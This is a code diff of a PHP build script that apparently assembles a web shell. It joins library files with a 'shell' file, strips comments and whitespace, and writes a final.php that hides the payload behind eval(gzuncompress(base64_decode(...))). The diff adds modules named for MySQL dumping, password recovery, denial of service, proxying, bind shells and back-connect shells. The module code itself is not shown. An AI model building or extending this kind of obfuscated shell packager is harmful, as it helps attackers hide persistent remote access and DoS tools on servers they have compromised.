@@ -2,22 +2,35 @@
 
 $sData = "<?php\r\n";
 
-$aFiles = array( 'LibProd/Arr', 'LibProd/Form', 'LibProd/Request' );
-if( isset( $argv[1] ) && ( $argv[1] !== 'lite' ) )
+if( ! isset( $argv[1] ) || ( isset( $argv[1] ) && ( $argv[1] === 'lite' ) ) )
 {
-	$aFiles = array_merge( $aFiles, array( 'LibProd/ModuleMysqlDumper', 'LibProd/ModulePasswordRecovery', 'LibProd/ModuleDos', 'LibProd/ModuleProxy' ) );
-}
-$aFiles = array_merge( $aFiles, array( 'shell' ) );
+	$aFiles = array( 'LibProd/Arr', 'LibProd/Form', 'LibProd/Request' );
 
-foreach( $aFiles as $sFile )
+	if( ! isset( $argv[1] ) )
+	{
+		$aFiles = array_merge( $aFiles, array( 'Lib/ModuleMysqlDumper', 'Lib/ModulePasswordRecovery', 'Lib/ModuleDos', 'Lib/ModuleProxy', 'Lib/ModuleBind', 'Lib/ModuleBackConnect' ) );
+	}
+	$aFiles = array_merge( $aFiles, array( 'shell' ) );
+
+	foreach( $aFiles as $sFile )
+	{
+		$sData .= file_get_contents( $sFile . '.php', NULL, NULL, 6 );
+	}
+
+	$sData = preg_replace( '~^require_once.+?[\r\n]+~m', NULL, $sData ) . "?>";
+
+	file_put_contents( __DIR__ . '/Tmp/dev.php', $sData );
+}
+else if( isset( $argv[1] ) && ( $argv[1] === 'modules' ) )
 {
-	$sData .= file_get_contents( $sFile . '.php', NULL, NULL, 6 );
+	foreach( array( 'Lib/ModuleMysqlDumper', 'Lib/ModulePasswordRecovery', 'Lib/ModuleDos', 'Lib/ModuleProxy', 'Lib/ModuleBind', 'Lib/ModuleBackConnect' ) as $sFile )
+	{
+		$sData .= file_get_contents( $sFile . '.php', NULL, NULL, 6 );
+	}
 }
 
 
-$sData = preg_replace( '~^require_once.+?[\r\n]+~m', NULL, $sData ) . "?>";
 
-file_put_contents( __DIR__ . '/Tmp/dev.php', $sData );
 
 /**
  * Wyrazenie " ! " -> "!"
@@ -42,7 +55,7 @@ $sData = preg_replace( '~\s+\:\s~', ':', $sData );
 /**
  * Usuwanie komentarzy
  */
-$sData = preg_replace( '~/\*(.+?)\*/~s', NULL, $sData );
+$sData = preg_replace( '~/\*\*(.+?)\*/~s', NULL, $sData );
 
 /**
  * Usuwanie tabualtorow
@@ -130,7 +143,15 @@ $sData = preg_replace( '~(_GET|_POST|_SERVER|_FILES|null|true);[\r\n]+~i', '$1;'
 
 $sData = preg_replace( '~\';[\r\n+]~i', '\';', $sData );
 
-file_put_contents( __DIR__ . '/Tmp/prod.php', $sData );
+if( isset( $argv[1] ) && $argv[1] === 'modules' )
+{
+	file_put_contents( __DIR__ . '/Tmp/modules.txt', $sData . "\r\n?>" );
+	exit ;
+}
+else
+{
+	file_put_contents( __DIR__ . '/Tmp/prod.php', $sData );
+}
 
 $sData = '?>' . $sData . '<?';
 
@@ -140,4 +161,3 @@ for( $i = 0; $i < 10; $i++ )
 }
 
 file_put_contents( __DIR__ . '/Tmp/final.php', sprintf( "<?php eval(gzuncompress(base64_decode('%s')));", base64_encode( gzcompress( $sData, 9 ) ) ) );
-exit;
